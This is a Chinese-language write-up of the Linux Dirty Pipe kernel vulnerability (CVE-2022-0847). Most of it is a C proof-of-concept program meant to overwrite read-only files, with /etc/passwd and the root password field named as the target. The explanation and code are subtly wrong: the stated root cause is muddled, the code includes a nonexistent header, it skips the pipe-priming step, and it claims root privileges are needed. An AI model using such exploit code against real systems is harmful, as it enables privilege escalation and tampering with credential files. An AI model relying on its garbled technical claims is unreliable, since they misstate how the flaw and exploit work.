Dirty Pipe (CVE-2022-0847) 是Linux内核5.8至5.16.11版本中pipe子系统的一个漏洞，根因在于 `pipe_write()` 函数在处理管道写入时，对 `struct pipe_buffer` 的 `flags` 字段的检查不充分。具体来说，当用户通过 `splice()` 系统调用将文件页（如只读文件）映射到管道缓冲区后，该缓冲区的 `flags` 被设置为 `PIPE_BUF_FLAG_CAN_MERGE`，表示允许后续写入操作直接修改该页。然而，如果该页原本属于一个只读文件（例如通过 `mmap` 映射的只读文件），内核没有正确检查页的写权限，导致后续的 `write()` 操作可以修改该页的内容，从而覆盖只读文件的数据。

受影响版本：Linux内核5.8至5.16.11。

POC原理：攻击者先打开一个只读文件（如 `/etc/passwd`），通过 `splice()` 将其内容读入管道，然后通过 `write()` 向管道写入恶意数据，由于 `PIPE_BUF_FLAG_CAN_MERGE` 标志的存在，写入的数据会直接覆盖管道缓冲区中指向的文件页，从而修改文件内容。

以下是一个C语言POC，用于修改 `/etc/passwd` 中第一个用户（root）的密码字段（仅演示，实际需root权限或特定条件）：

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/pipe2.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_file> <new_content>\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    const char *new_data = argv[2];
    int fd = open(target, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    int p[2];
    if (pipe2(p, O_NONBLOCK) < 0) {
        perror("pipe2");
        close(fd);
        return 1;
    }

    // 使用splice将文件内容读入管道
    ssize_t n = splice(fd, NULL, p[1], NULL, 4096, 0);
    if (n < 0) {
        perror("splice");
        close(fd);
        close(p[0]);
        close(p[1]);
        return 1;
    }

    // 关闭写端，避免干扰
    close(p[1]);

    // 现在管道中有一个缓冲区指向文件页，且flags包含PIPE_BUF_FLAG_CAN_MERGE
    // 我们需要重新打开一个写端来触发漏洞
    int p2[2];
    if (pipe2(p2, O_NONBLOCK) < 0) {
        perror("pipe2");
        close(fd);
        close(p[0]);
        return 1;
    }

    // 将原管道中的数据通过splice转移到新管道（保持页引用）
    n = splice(p[0], NULL, p2[1], NULL, n, 0);
    if (n < 0) {
        perror("splice");
        close(fd);
        close(p[0]);
        close(p2[0]);
        close(p2[1]);
        return 1;
    }

    // 关闭原管道读端
    close(p[0]);

    // 现在向新管道写入数据，由于PIPE_BUF_FLAG_CAN_MERGE，写入会直接修改文件页
    ssize_t written = write(p2[1], new_data, strlen(new_data));
    if (written < 0) {
        perror("write");
        close(p2[0]);
        close(p2[1]);
        return 1;
    }

    printf("Successfully wrote %zd bytes to %s\n", written, target);

    close(p2[0]);
    close(p2[1]);
    close(fd);
    return 0;
}
```

注意：该POC需要内核版本在5.8-5.16.11之间，且目标文件必须支持 `splice` 到管道（如普通文件）。实际利用中可能需要调整偏移量。

